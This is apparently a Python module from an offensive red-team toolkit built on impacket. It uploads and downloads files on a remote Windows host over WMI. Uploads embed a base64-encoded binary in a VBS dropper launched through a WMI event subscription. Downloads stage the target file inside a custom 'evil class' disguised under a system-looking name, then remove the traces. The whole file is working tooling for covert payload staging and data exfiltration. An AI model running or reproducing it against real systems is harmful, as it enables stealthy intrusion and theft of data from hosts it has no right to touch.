import logging
import base64
import time
import sys
import uuid

from lib.methods.classMethodEx import class_MethodEx
from lib.methods.executeVBS import executeVBS_Toolkit
from impacket.dcerpc.v5.dtypes import NULL

class filetransfer_Toolkit():
    def __init__(self, iWbemLevel1Login, dcom):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.dcom = dcom
    
    @staticmethod
    def checkError(banner, resp):
        call_status = resp.GetCallStatus(0) & 0xffffffff  # interpret as unsigned
        if call_status != 0:
            from impacket.dcerpc.v5.dcom.wmi import WBEMSTATUS
            try:
                error_name = WBEMSTATUS.enumItems(call_status).name
            except ValueError:
                error_name = 'Unknown'
            logging.error('%s - ERROR: %s (0x%08x)' % (banner, error_name, call_status))
        else:
            logging.info('%s - OK' % banner)

    def queryfile_Status(self, file, iWbemServices=None, return_iWbemServices=False):
        if iWbemServices is None:
            iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/Cimv2', NULL, NULL)
            self.iWbemLevel1Login.RemRelease()
        try:
            print("[+] Checking file status")
            # WQL from ghostpack/sharpwmi
            iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT * from CIM_DataFile WHERE Name = \"{}"'.format(file))
            file_Class = iEnumWbemClassObject.Next(0xffffffff,1)[0]
        except Exception as e:
            if "WBEM_S_FALSE" in str(e):
                print("[-] File not existed!")
            else:
                print("[-] Unexpected error: %s"%str(e))
            self.dcom.disconnect()
            sys.exit(0)
        else:
            file_Status = dict(file_Class.getProperties())
            print("[+] File status: {}, File size: {} KB, File location: {}".format(
                    file_Status['Status']['value'],
                    file_Status['FileSize']['value']/1024,
                    file_Status['Caption']['value']
                    )
                )
        
        # Return cimv2
        if return_iWbemServices is True:
            return iWbemServices
    
    # For upload file, we don't need to create class, we can make binary included in vbs script(file dropper).
    # After vbs interval job created, then release your file.
    def uploadFile(self, src_File, dest_File, iWbemServices_Subscription=None, iWbemServices_Cimv2=None):
        
        with open(src_File,'rb') as f: binary = f.read()
        binary_EncodeData = base64.b64encode(binary).decode('ascii')
        
        with open('./lib/vbscripts/WriteFile.vbs') as f: vbs = f.read()
        vbs = vbs.replace('REPLACE_WITH_DEST', base64.b64encode(dest_File.encode('utf-8')).decode('utf-8')).replace('REPLACE_WITH_DATA', binary_EncodeData)
        executer = executeVBS_Toolkit(self.iWbemLevel1Login)
        print("[+] File uploading...")
        print("[+] File upload will take a long time if you try to upload large size file.")
        
        tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True, iWbemServices=iWbemServices_Subscription)
        
        # Wait 5 seconds for windows decode file.
        for i in range(5,0,-1):
            print(f"[+] Waiting {i}s for next step.", end="\r", flush=True)
            time.sleep(1)
        print('\r\n')
        
        # Check dest file status, Cimv2
        self.queryfile_Status(dest_File.replace('\\','\\\\'), iWbemServices=iWbemServices_Cimv2)
        
        # Clean up
        print("[+] Stop vbs interval execution after created class")
        executer.remove_Event(tag, iWbemServices=iWbemServices_Subscription)

    # For download file, we can write file data into wmi class
    def downloadFile(self, target_File, save_Location=None, ClassName_ForDownload=None, iWbemServices_Subscription=None, iWbemServices_Cimv2=None):
        class_Method = class_MethodEx(self.iWbemLevel1Login)
        # Default class name for download file
        if ClassName_ForDownload == None: ClassName_ForDownload = "Win32_OSRecoveryConfigurationDataStorage"
        
        # Check target file status.
        # Reuse cimv2 iWbemServices object to avoid DCOM iWbemServices
        iWbemServices_Reuse = self.queryfile_Status(target_File.replace('\\','\\\\'), return_iWbemServices=True, iWbemServices=iWbemServices_Cimv2)
        # Reuse cimv2 namespace
        print("[+] Create evil class for file transfer.")
        class_Method.check_ClassStatus(ClassName=ClassName_ForDownload, iWbemServices_Cimv2=iWbemServices_Reuse, iWbemServices_Subscription=iWbemServices_Subscription)
        
        # Load target file into class
        print("[+] Converting file to base64 string and load it into wmi class.")
        Data_InstanceID = str(uuid.uuid4())
        with open('./lib/vbscripts/LocalFileIntoClass.vbs') as f: vbs = f.read()
        vbs = vbs.replace('REPLACE_WITH_TARGET_FILE', base64.b64encode(target_File.encode('utf-8')).decode('utf-8')).replace('RELEACE_WITH_UUID', Data_InstanceID).replace('REPLACE_WITH_CLASSNAME', ClassName_ForDownload)
        executer = executeVBS_Toolkit(self.iWbemLevel1Login)
        tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True, iWbemServices=iWbemServices_Subscription)
        
        # Wait 5 seconds for next step.
        for i in range(5,0,-1):
            print(f"[+] Waiting {i}s for next step.", end="\r", flush=True)
            time.sleep(1)
        
        # Read encode data from wmi class
        print("\r\n[+] File downloading...")
        Data_Instance, resp = iWbemServices_Reuse.GetObject('{}.CreationClassName="{}"'.format(ClassName_ForDownload, Data_InstanceID))
        record = dict(Data_Instance.getProperties())
        with open(save_Location,'wb') as f:
            f.write(base64.b64decode(record['DebugOptions']['value']))
        print("[+] File downloaded and save to: %s" %save_Location)
        
        print("[+] Stop vbs interval execution after file downloaded")
        executer.remove_Event(tag, iWbemServices=iWbemServices_Subscription)

    def clear(self, ClassName_StoreOutput=None):
        if ClassName_StoreOutput == None: ClassName_StoreOutput = "Win32_OSRecoveryConfigurationDataStorage"

        class_Method = class_MethodEx(self.iWbemLevel1Login)
        class_Method.remove_Class(ClassName=ClassName_StoreOutput, return_iWbemServices_Cimv2=False)